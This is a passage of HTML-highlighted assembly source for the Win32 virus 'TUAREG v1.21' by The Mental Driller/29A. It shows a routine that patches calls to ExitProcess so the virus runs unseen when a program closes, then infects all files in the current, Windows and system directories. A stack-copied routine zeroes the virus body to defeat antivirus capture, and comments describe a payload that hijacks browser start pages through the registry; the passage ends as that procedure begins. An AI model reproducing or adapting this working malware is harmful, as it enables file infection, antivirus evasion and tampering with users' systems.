                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopAPI</span><span class="sc0">    </span><span class="sc1">; Loop</span><span class="sc0">
   </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; When we arrive here, we have the checksum</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; of the API name.</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">GetCRCOfAPI</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Now the ident message. Never showed, but it'll help the AVers to name this</span><span class="sc0">
</span><span class="sc1">;; virus ;)</span><span class="sc0">
</span><span class="sc5">Ident_Virus</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'[Virus TUAREG v1.21 by The Mental Driller/29A]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'- This virus has been designed for carrying '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'the TUAREG engine -'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This functions scans for any ocurrence of ExitProcess in the .text section</span><span class="sc0">
</span><span class="sc1">;; and substitutes the address in the call for an address here. Once here, we</span><span class="sc0">
</span><span class="sc1">;; move a little program to the stack frame and then we jump there. That pro-</span><span class="sc0">
</span><span class="sc1">;; gram will overwrite the virus code with zeroes. This feature can fuck some</span><span class="sc0">
</span><span class="sc1">;; AVers programs that get a decrypted copy of the virus executing the infec-</span><span class="sc0">
</span><span class="sc1">;; ted program and waiting for finish.</span><span class="sc0">
</span><span class="sc5">ModifyExitProcess</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessInImport</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">          </span><span class="sc1">; If ExitProcess doesn't exist in the</span><span class="sc0">
                                        </span><span class="sc1">; import directory, finish</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressToLastFunc</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get the address to over-</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastFunction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; write ExitProcess callings</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; with, pointing to our routi-</span><span class="sc0">
                                                </span><span class="sc1">; ne</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressToAddressToLastFunc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RestoreAddress2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; beginning of .text</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfText2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Quantity of code to scan</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">; Last 5 bytes can't contain a call, and maybe</span><span class="sc0">
                               </span><span class="sc1">; we generate an exception if we overpass .text</span><span class="sc0">
                               </span><span class="sc1">; size</span><span class="sc0">
  </span><span class="sc5">@@Loop_001</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallToSearch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Address to constructed call</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">     </span><span class="sc1">; Size of call</span><span class="sc0">
  </span><span class="sc5">@@Loop_002</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmpsb</span><span class="sc0">              </span><span class="sc1">; Test byte</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextByte</span><span class="sc0">   </span><span class="sc1">; If it isn't equal, jump</span><span class="sc0">
  </span><span class="sc5">@@Loop_003</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Decrease call-size counter</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Found</span><span class="sc0">      </span><span class="sc1">; If 0, we've found a call to ExitProcess</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">; Call-size counter=5?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next_001</span><span class="sc0">   </span><span class="sc1">; If not, check normally</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Decrease .text-size counter</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">     </span><span class="sc1">; If it's 0, return</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Increase checking indexes</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; ...And now check two possible opcodes:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0"> </span><span class="sc1">; CALL [Address]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Loop_003</span><span class="sc0">              </span><span class="sc1">; If it is, continue checking</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0"> </span><span class="sc1">; JMP [Address]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextByte</span><span class="sc0">       </span><span class="sc1">; If it isn't, "restart" call string</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Loop_003</span><span class="sc0">   </span><span class="sc1">; Check next byte (now normally)</span><span class="sc0">
   </span><span class="sc5">@@Next_001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; End of .text?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_002</span><span class="sc0">   </span><span class="sc1">; If not, continue checking that call</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">     </span><span class="sc1">; If yes, end</span><span class="sc0">
   </span><span class="sc5">@@NextByte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; End of .text?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">   </span><span class="sc1">; If not, continue checking for calls</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">     </span><span class="sc1">; If yes, end</span><span class="sc0">
   </span><span class="sc5">@@Found</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; Decrease ecx (don't decreased before)</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">          </span><span class="sc1">; Save regs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; Write 4 bytes (overwrite address reference)</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressToAddressToLastFunc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; Thing to write (the dword in this variable)</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; Place to overwrite (the address in the found</span><span class="sc0">
                                </span><span class="sc1">; call)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetCurrentProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Write on the current process</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_WriteProcessMemory</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Overwrite!</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">           </span><span class="sc1">; Restore registers values</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0"> </span><span class="sc1">; Continue looking for calls to ExitProcess</span><span class="sc0">
      </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">        </span><span class="sc1">; Return  </span><span class="sc0">
</span><span class="sc5">ModifyExitProcess</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CallToSearch</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">  </span><span class="sc1">; Here we construct a call to ExitProcess</span><span class="sc0">
</span><span class="sc5">ExitProcessInImport</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; for searching it over .text</span><span class="sc0">

</span><span class="sc5">SizeOfText</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0">   </span><span class="sc1">; This is the value on first generation, but</span><span class="sc0">
                               </span><span class="sc1">; it's set with the real value on infection</span><span class="sc0">
</span><span class="sc5">SizeOfText2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Variable to save this value and don't overwrite</span><span class="sc0">
                             </span><span class="sc1">; it when infecting</span><span class="sc0">
</span><span class="sc5">AddressToLastFunc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Some vars to overwrite the call to ExitProcess</span><span class="sc0">
</span><span class="sc5">AddressToAddressToLastFunc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function is the one that we make ExitProcess to point to. Well, we</span><span class="sc0">
</span><span class="sc1">;; make that the calls to ExitProcess point here, so they aren't calls to</span><span class="sc0">
</span><span class="sc1">;; ExitProcess anymore, but here... bah, more or less :). The fact is that if</span><span class="sc0">
</span><span class="sc1">;; we patched correctly the calls to ExitProcess, this function will be called</span><span class="sc0">
</span><span class="sc1">;; when you close the application (alt-F4, or Close in its menu, etc. etc.),</span><span class="sc0">
</span><span class="sc1">;; and here we can make lots of things without being noticed by the user as</span><span class="sc0">
</span><span class="sc1">;; easily as if we make it at the beginning, because s/he closed the applica-</span><span class="sc0">
</span><span class="sc1">;; tion and the desktop was restored, seeming a complete exiting, but this</span><span class="sc0">
</span><span class="sc1">;; virus is still alive! When we arrive here, we infect ALL files, since we</span><span class="sc0">
</span><span class="sc1">;; haven't to do the things quickly (and you can think: then, why don't you</span><span class="sc0">
</span><span class="sc1">;; wait for this function to do all and make things more unnoticeable? Because</span><span class="sc0">
</span><span class="sc1">;; if ExitProcess patching fails, at least the virus has been spreaded a</span><span class="sc0">
</span><span class="sc1">;; bit ;). Before the massive infection, we complete a little overwriting rou-</span><span class="sc0">
</span><span class="sc1">;; tine and we copy it to the stack frame. After infection, we jump there, and</span><span class="sc0">
</span><span class="sc1">;; that routine will overwrite all the virus body with 0s to avoid getting a</span><span class="sc0">
</span><span class="sc1">;; clean copy of the virus when the application ends (AVers use that technique</span><span class="sc0">
</span><span class="sc1">;; quite a lot). If I made the virus without per-process residency, I could</span><span class="sc0">
</span><span class="sc1">;; make it before jumping to the restored host, but well...</span><span class="sc0">
</span><span class="sc5">LastFunction</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">1800h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Copy the routine to the stack (qui-</span><span class="sc0">
                                         </span><span class="sc1">; te far up, to avoid overwriting)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BDh</span><span class="sc0">             </span><span class="sc1">; MOV EBP,xxx</span><span class="sc0">
</span><span class="sc5">DeltaOffset4</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; EBP=DeltaOffset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastStack</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the saved stack address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">             </span><span class="sc1">; Eliminate some things of B4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_ExitProcess</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the address to there</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Complete the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetValueToEDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Set the jumping value</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZeroingFunction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ESI=Address to function</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Inic_Virus</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EAX=Beginning of the virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InicAddressFor0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Complete instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ZeroingFunctionEnd</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ZeroingFunction</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">                            </span><span class="sc1">; ECX=Size of zeroing routine</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                  </span><span class="sc1">; Copy routine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectAllFiles</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Now infect all fi-</span><span class="sc0">
                                    </span><span class="sc1">; les on current, windows and system</span><span class="sc0">
                                    </span><span class="sc1">; directories, instead of one of each four</span><span class="sc0">

           </span><span class="sc1">;; SEH frame</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@JumpToFinish</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastStack</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">; For SEH returning</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RuntimeInfection</span><span class="sc0">
   </span><span class="sc5">@@JumpToFinish</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@@JumpToHost</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BDh</span><span class="sc0">
</span><span class="sc5">DeltaOffset5</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; This is MOV EBP,DeltaOffset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastStack</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Recover ESP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Restore SEH</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Release our handle from stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BFh</span><span class="sc0">
</span><span class="sc5">SetValueToEDI</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Get the address to jump to overwrite this code</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Jump there</span><span class="sc0">
</span><span class="sc5">LastFunction</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ExitCode</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function, after being completed, is the one that we copy to the stack</span><span class="sc0">
</span><span class="sc1">;; frame to jump and overwrite the code of this virus. After overwriting it,</span><span class="sc0">
</span><span class="sc1">;; we call to ExitProcess and finish the activity</span><span class="sc0">
</span><span class="sc5">ZeroingFunction</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">   </span><span class="sc1">; EDI=Beginning address of virus</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">InicAddressFor0</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; EAX=6726D43Ah :P</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; ECX=Virtual size in dwords</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">; Overwrite!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">   </span><span class="sc1">; Before, we put here the address to</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; ExitProcess</span><span class="sc0">
</span><span class="sc5">ExitProcessAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc1">; push    0                ; Push ExitProcess return value</span><span class="sc0">
                                         </span><span class="sc1">; It's set from before!</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">ZeroingFunction</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">ZeroingFunctionEnd</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc1">; NOTE: When I was commenting this code (now, for me :), I realized that an</span><span class="sc0">
</span><span class="sc1">; infected application always will return 0 as errorlevel when ExitProcess,</span><span class="sc0">
</span><span class="sc1">; because I push a 0 before calling ExitProcess. The correct way of doing this</span><span class="sc0">
</span><span class="sc1">; would be get the value from stack and push it now, since it comes from a</span><span class="sc0">
</span><span class="sc1">; call to ExitProcess that we patched. I realized of this "bug" after sending</span><span class="sc0">
</span><span class="sc1">; the final version to AVers, so I didn't correct it on this source. Now it's</span><span class="sc0">
</span><span class="sc1">; corrected.</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; PAYLOAD                                                                  ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; On the first and third Friday of the month, the start pages of Netscape  ;;</span><span class="sc0">
</span><span class="sc1">;; and Internet Explorer are changed to "http://www.thehungersite.com".     ;;</span><span class="sc0">
</span><span class="sc1">;; The first really useful payload in the viruscene history! (Well, I dunno ;;</span><span class="sc0">
</span><span class="sc1">;; if it is the first, but I like to think it :)                            ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                          ;;</span><span class="sc0">
</span><span class="sc1">;; It's not as easy as it could seem!                                       ;;</span><span class="sc0">
</span><span class="sc1">;; Internet Explorer --&gt; We modify the registry entry where the start page  ;;</span><span class="sc0">
</span><span class="sc1">;;                       is especified                                      ;;</span><span class="sc0">
</span><span class="sc1">;; Netscape --&gt; We get the directories of all the users via the registry    ;;</span><span class="sc0">
</span><span class="sc1">;;              and add a line to the file PREFS.JS setting a new start     ;;</span><span class="sc0">
</span><span class="sc1">;;              page                                                        ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000F003Fh</span><span class="sc0">  </span><span class="sc1">; Values for the registry functions</span><span class="sc0">
</span><span class="sc5">HKEY_CLASSES_ROOT</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000001h</span><span class="sc0">
</span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000002h</span><span class="sc0">
</span><span class="sc5">HKEY_USERS</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000003h</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
